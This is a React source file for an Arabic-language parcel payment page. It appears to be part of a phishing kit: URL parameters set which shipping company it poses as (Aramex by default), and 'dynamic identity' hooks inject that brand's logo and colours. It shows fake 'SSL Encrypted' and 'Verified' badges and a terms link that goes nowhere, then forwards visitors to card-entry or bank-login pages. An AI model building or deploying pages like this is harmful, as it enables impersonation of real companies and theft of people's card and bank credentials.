import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import BrandedCarousel from "@/components/BrandedCarousel";
import { detectEntityFromURL, getEntityLogo, getEntityIdentity } from "@/lib/dynamicIdentity";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
import PageLoader from "@/components/PageLoader";
import { EntityVisualInjector } from "@/components/EntityVisualInjector";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError } = useLink(id);
  const [showPage, setShowPage] = useState(false);

  // Apply dynamic identity
  useAutoApplyIdentity();
  const { identity: dynamicIdentity } = useDynamicIdentity();

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const shippingInfo = linkData?.payload as any;
  
  const amountParam = urlParams.get('amount');
  const currencyParam = urlParams.get('currency');
  const methodParam = urlParams.get('method') || urlParams.get('pm');
  const countryParam = urlParams.get('country');
  
  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
  const currencyInfo = getCurrencyByCountry(countryCode);

  const [amount, setAmount] = useState<string>(() => {
    const raw = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
    return raw ? raw.toString() : "";
  });

  const displayAmount = parseFloat(amount) || 0;
  const formattedAmount = formatCurrency(displayAmount, currencyParam || countryCode);

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
  }
  
  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = entityLogo || branding.logo;
  
  const primaryColor = dynamicIdentity?.colors?.primary || companyBranding?.colors.primary || branding.colors.primary;
  const secondaryColor = dynamicIdentity?.colors?.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
  
  const handleProceed = () => {
    const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
    
    const nextUrl = paymentMethod === 'bank_login' 
      ? `/pay/${id}/bank-selector?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`
      : `/pay/${id}/card-input?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`;
    
    navigate(nextUrl);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`تفاصيل الدفع - ${serviceName}`}
        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
        amount={formattedAmount}
      />

      {/* Branded Header - Transparent Background, Logo Removed */}
      <div 
        className="sticky top-0 z-50 w-full shadow-lg"
        style={{
          background: 'transparent',
          backdropFilter: 'blur(10px)',
          borderBottom: `3px solid ${primaryColor}`
        }}
      >
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between h-16 sm:h-18">
            <div className="flex items-center gap-4">
              <div style={{ color: primaryColor }}>
                <h2 className="text-lg sm:text-xl font-bold">
                  {serviceName}
                </h2>
                <p className="text-xs opacity-75">
                  الدفع الآمن - Secure Payment
                </p>
              </div>
            </div>
            
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full backdrop-blur-sm" style={{ backgroundColor: `${primaryColor}20`, color: primaryColor }}>
              <ShieldCheck className="w-4 h-4" />
              <span className="text-xs font-medium">آمن</span>
            </div>
          </div>
        </div>
      </div>

      {/* Hero Carousel */}
      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />

      {/* Main Content */}
      <div 
        className="min-h-screen py-8 sm:py-12"
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
        }}
      >
        <div className="container mx-auto px-4 max-w-2xl">
          {/* Page Title */}
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
              <h1 
                className="text-3xl sm:text-4xl font-bold"
                style={{
                  color: designSystem.colors.neutral[900],
                  fontFamily: designSystem.typography.fontFamilies.arabic
                }}
              >
                تفاصيل الدفع
              </h1>
            </div>
            <p className="text-base text-gray-600">
              راجع تفاصيل طلبك قبل المتابعة للدفع
            </p>
          </div>

          <Card 
            className="overflow-hidden border-0 mb-6"
            style={{
              borderRadius: '20px',
              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
            }}
          >
            {/* Shipping Info Display */}
            {shippingInfo && (
              <>
                <div 
                  className="px-6 sm:px-8 py-6"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                    borderBottom: `2px solid ${primaryColor}30`
                  }}
                >
                  <div className="flex items-center gap-3">
                    <div 
                      className="w-12 h-12 rounded-xl flex items-center justify-center"
                      style={{
                        background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
                      }}
                    >
                      <Package className="w-6 h-6 text-white" />
                    </div>
                    <div>
                      <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                        تفاصيل الشحنة
                      </h2>
                      <p className="text-sm text-gray-600">
                        معلومات الطرد والتوصيل
                      </p>
                    </div>
                  </div>
                </div>

                <div className="px-6 sm:px-8 py-6 bg-white space-y-4">
                  {shippingInfo.tracking_number && (
                    <div className="flex items-center justify-between py-3 border-b">
                      <div className="flex items-center gap-2 text-gray-600">
                        <Hash className="w-4 h-4" />
                        <span className="text-sm">رقم الشحنة</span>
                      </div>
                      <span className="font-bold text-base">{shippingInfo.tracking_number}</span>
                    </div>
                  )}
                  {shippingInfo.package_description && (
                    <div className="flex items-center justify-between py-3 border-b">
                      <div className="flex items-center gap-2 text-gray-600">
                        <Truck className="w-4 h-4" />
                        <span className="text-sm">وصف الطرد</span>
                      </div>
                      <span className="font-semibold text-base">{shippingInfo.package_description}</span>
                    </div>
                  )}
                </div>
              </>
            )}
          </Card>

          {/* Payment Summary */}
          <Card 
            className="overflow-hidden border-0 mb-6"
            style={{
              borderRadius: '20px',
              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
            }}
          >
            <div 
              className="px-6 sm:px-8 py-6"
              style={{
                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                borderBottom: `2px solid ${primaryColor}30`
              }}
            >
              <div className="flex items-center gap-3">
                <div 
                  className="w-12 h-12 rounded-xl flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
                  }}
                >
                  <DollarSign className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                    ملخص الدفع
                  </h2>
                  <p className="text-sm text-gray-600">
                    المبلغ المطلوب
                  </p>
                </div>
              </div>
            </div>

            <div className="px-6 sm:px-8 py-6 bg-white space-y-4">
              <div className="flex justify-between py-3 border-b">
                <span className="text-gray-600">الخدمة</span>
                <span className="font-bold text-base">{serviceName}</span>
              </div>
              
              {amount && (
                <div 
                  className="flex justify-between items-center py-5 px-5 rounded-xl animate-in fade-in slide-in-from-top-2"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
                  }}
                >
                  <span className="text-lg font-bold">المبلغ الإجمالي</span>
                  <span className="text-3xl font-bold" style={{ color: primaryColor }}>
                    {formattedAmount}
                  </span>
                </div>
              )}
            </div>
          </Card>

          {/* Payment Method */}
          <Card 
            className="overflow-hidden border-0 mb-8"
            style={{
              borderRadius: '20px',
              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
            }}
          >
            <div 
              className="px-6 sm:px-8 py-6"
              style={{
                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                borderBottom: `2px solid ${primaryColor}30`
              }}
            >
              <div className="flex items-center gap-3">
                <div 
                  className="w-12 h-12 rounded-xl flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
                  }}
                >
                  <CreditCard className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                    طريقة الدفع
                  </h2>
                  <p className="text-sm text-gray-600">
                    الدفع الإلكتروني الآمن
                  </p>
                </div>
              </div>
            </div>

            <div className="px-6 sm:px-8 py-6 bg-white">
              {(methodParam || (linkData?.payload as any)?.payment_method) === 'bank_login' ? (
                <div 
                  className="flex items-center gap-4 p-5 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: `${primaryColor}20`
                    }}
                  >
                    <Lock className="w-6 h-6" style={{ color: primaryColor }} />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-base mb-1">تسجيل دخول البنك 🏦</p>
                    <p className="text-sm text-gray-600">
                      الدفع الآمن عبر حسابك البنكي
                    </p>
                  </div>
                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                </div>
              ) : (
                <div 
                  className="flex items-center gap-4 p-5 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: `${primaryColor}20`
                    }}
                  >
                    <CreditCard className="w-6 h-6" style={{ color: primaryColor }} />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-base mb-1">الدفع بالبطاقة 💳</p>
                    <p className="text-sm text-gray-600">
                      Visa • Mastercard • Mada
                    </p>
                  </div>
                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                </div>
              )}
            </div>
          </Card>
      
          {/* Proceed Button */}
          <Button
            onClick={handleProceed}
            size="lg"
            className="w-full text-xl py-8 text-white font-bold transition-all duration-300 hover:shadow-2xl rounded-xl"
            style={{
              background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
              boxShadow: `0 12px 32px -8px ${primaryColor}70`
            }}
          >
            <span className="ml-3">متابعة للدفع</span>
            <ArrowLeft className="w-6 h-6 mr-2" />
          </Button>
    
          <div className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-600">
            <Lock className="w-4 h-4" />
            <p>
              بالمتابعة، أنت توافق على{' '}
              <a href="#" className="underline hover:no-underline" style={{ color: primaryColor }}>
                الشروط والأحكام
              </a>
            </p>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
              <div className="flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5" />
                <span>Verified</span>
              </div>
            </div>
            <p className="text-xs text-gray-400">
              © 2025 {serviceName}. جميع الحقوق محفوظة.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
